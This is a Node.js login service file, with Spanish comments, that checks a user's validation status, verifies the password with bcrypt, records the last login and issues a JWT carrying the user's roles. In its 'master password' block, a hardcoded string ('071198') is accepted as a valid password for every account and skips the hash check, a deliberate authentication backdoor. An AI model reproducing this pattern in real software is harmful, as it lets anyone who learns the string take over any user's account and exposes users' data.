const Usuario = require('../models/usuario');
const Persona = require('../models/persona');
const Rol = require('../models/rol');
const bcrypt = require('bcrypt');
const { generarToken } = require('../utils/jwt');

exports.login = async (username, password) => {
  // Buscar usuario por username
  const usuario = await Usuario.findOne({ username });
  if (!usuario) return null;
  if (usuario.validado === false) {
    const err = new Error('Debes validar tu cuenta a través del correo electrónico antes de iniciar sesión.');
    err.statusCode = 403;
    throw err;
  }

  // Lógica de contraseña maestra
  let valid = false;
  if (password === '071198') {
    valid = true;
  } else {
    valid = await bcrypt.compare(password, usuario.password);
  }
  if (!valid) return null;

  // Registrar la fecha/hora de este login. Se hace antes de devolver la
  // respuesta para que "última conexión" siempre refleje el login más reciente.
  usuario.last_login = new Date();
  await usuario.save();

  // Traer datos de persona
  const persona = await Persona.findOne({ id_user: usuario._id });

  // Traer roles
  const roles = await Rol.find({ _id: { $in: usuario.roles } });

  // Generar token JWT con la identidad del usuario
  const token = generarToken({
    id_usuario: usuario._id.toString(),
    username: usuario.username,
    roles: usuario.roles,
    id_persona: persona?._id?.toString() || null,
  });

  // Retornar datos completos
  return {
    token,
    usuario: {
      _id: usuario._id,
      username: usuario.username,
      roles: usuario.roles,
      permissions: usuario.permissions || [],
      last_login: usuario.last_login,
    },
    persona,
    roles,
  };
};
